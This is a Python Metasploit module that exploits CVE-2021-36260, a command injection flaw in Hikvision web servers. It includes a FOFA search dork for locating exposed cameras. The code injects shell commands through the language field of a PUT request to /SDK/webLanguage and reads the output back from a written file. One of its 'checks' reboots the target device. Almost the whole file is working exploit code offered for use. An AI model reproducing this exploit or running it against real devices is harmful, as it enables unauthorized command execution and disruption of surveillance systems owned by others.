#!/usr/bin/env python3
from metasploit import module

dependencies_missing = False
try:
    import requests
    import time
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'Hikvision Web Server Build 210702 - Command Injection POC',
    'description': '''
    Hikvision Web Server Build 210702 - Command Injection
    fofa search dork: app="HIKVISION-视频监控"
    ''',
    'authors': ["Taroballz", "ITRI-PTTeam"],
    'references': [
        {"type": "cve", "ref": "2021-36260"},
    ],
    'date': "2021-11-02",
    "type": "dos",
    "options": {
        'rhost': {'type': 'address', 'description': "Target address", 'required': True, 'default': None},
        'rport': {"type": "int", "description": "port", "required": True, "default": 80},
        'rssl': {"type": "bool", "description": "Negotiate SSL for outgoing connections", "required": True,
                 "default": 'false'},
    }
}


class Http(object):
    def __init__(self, rhost, rport, proto, timeout=60):
        super(Http, self).__init__()

        self.rhost = rhost
        self.rport = rport
        self.proto = proto
        self.timeout = timeout

        self.remote = None
        self.uri = None

        """ Most devices will use self-signed certificates, suppress any warnings """
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

        self.remote = requests.Session()

        self._init_uri()

        self.remote.headers.update({
            'Host': f'{self.rhost}:{self.rport}',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8',
        })

    def send(self, url=None, query_args=None, timeout=5):

        if query_args:
            """Some devices can handle more, others less, 22 bytes seems like a good compromise"""
            if len(query_args) > 22:
                module.log(f'Error: Command "{query_args}" to long ({len(query_args)})', 'error')
                return None

        """This weird code will try automatically switch between http/https
        and update Host
        """
        try:
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put('/SDK/webLanguage', query_args, timeout)
        except requests.exceptions.ConnectionError:
            self.proto = 'https' if self.proto == 'http' else 'https'
            self._init_uri()
            try:
                if url and not query_args:
                    return self.get(url, timeout)
                else:
                    data = self.put('/SDK/webLanguage', query_args, timeout)
            except requests.exceptions.ConnectionError:
                return None
        except requests.exceptions.RequestException:
            return None
        except KeyboardInterrupt:
            return None

        """302 when requesting http on https enabled device"""

        if data.status_code == 302:
            redirect = data.headers.get('Location')
            self.uri = redirect[:redirect.rfind('/')]
            self._update_host()
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put('/SDK/webLanguage', query_args, timeout)

        return data

    def _update_host(self):
        if not self.remote.headers.get('Host') == self.uri[self.uri.rfind('://') + 3:]:
            self.remote.headers.update({
                'Host': self.uri[self.uri.rfind('://') + 3:],
            })

    def _init_uri(self):
        self.uri = '{proto}://{rhost}:{rport}'.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))

    def put(self, url, query_args, timeout):
        """Command injection in the <language> tag"""
        query_args = '<?xml version="1.0" encoding="UTF-8"?>' \
                     f'<language>$({query_args})</language>'
        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)

    def get(self, url, timeout):
        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)


def check(remote):
    """
    status_code == 200 (OK);
        Verified vulnerable and exploitable
    status_code == 500 (Internal Server Error);
        Device may be vulnerable, but most likely not
        The SDK webLanguage tag is there, but generate status_code 500 when language not found
        I.e. Exist: <language>en</language> (200), not exist: <language>EN</language> (500)
        (Issue: Could also be other directory than 'webLib', r/o FS etc...)
    status_code == 401 (Unauthorized);
        Defiantly not vulnerable
    """

    module.log(f'Checking remote "{remote.rhost}:{remote.rport}"', 'info')

    data = remote.send(url='/', query_args=None)
    if data is None:
        module.log(f'Cannot establish connection to "{remote.rhost}:{remote.rport}"', 'error')
        return None
    module.log(f'ETag:{data.headers.get("ETag")}', 'info')

    data = remote.send(query_args='>webLib/c')
    if data is None or data.status_code == 404:
        module.log(f'"{remote.rhost}:{remote.rport}" do not looks like Hikvision')
        return False
    status_code = data.status_code

    data = remote.send(url='/c', query_args=None)
    if not data.status_code == 200:
        """We could not verify command injection"""
        if status_code == 500:
            module.log(f'Could not verify if vulnerable (Code: {status_code})', 'info')
            module.log(f'send reboot payload for check', 'info')
            return check_reboot(remote)

        else:
            module.log(f'Remote is not vulnerable (Code: {status_code})', 'error')
        return False

    module.log(f'Remote:{remote.rhost}:{remote.rport} is verified exploitable', 'good')
    return True


def check_reboot(remote):
    """
    We sending 'reboot', wait 2 sec, then checking with GET request.
    - if there is data returned, we can assume remote is not vulnerable.
    - If there is no connection or data returned, we can assume remote is vulnerable.
    """
    module.log(f'Checking remote "{remote.rhost}:{remote.rport}" with "reboot"')
    remote.send(query_args='reboot')
    time.sleep(2)
    if not remote.send(url='/', query_args=None):
        module.log('Remote is vulnerable', 'good')
        return True
    else:
        module.log('Remote is not vulnerable', 'error')
        return False


def cmd(remote, cmd):
    if not check(remote):
        return False
    data = remote.send(query_args=f'{cmd}>webLib/x')
    if data is None:
        module.log(f'Error execute cmd "{cmd}" and the data is None', 'error')
        return False

    data = remote.send(url='/x', query_args=None)
    if data is None or not data.status_code == 200:
        module.log(f'Error execute cmd "{cmd}"', 'error')
        return False
    module.log(f'pwd command: {data.text}', 'good')
    return True


def run(args):
    if dependencies_missing:
        module.log("Module dependencies (requests) missing, cannot continue", level="error")
        return

    host = args['rhost']
    if host[-1:] == '/':
        host = host[:-1]

    if args["rssl"] == "true":
        proto = "https"
    else:
        proto = "http"

    port = args["rport"]

    remote = Http(host, port, proto)

    try:
        cmd(remote, "pwd")
    except Exception as e:
        module.log(str(e), "error")


if __name__ == '__main__':
    module.run(metadata, run)
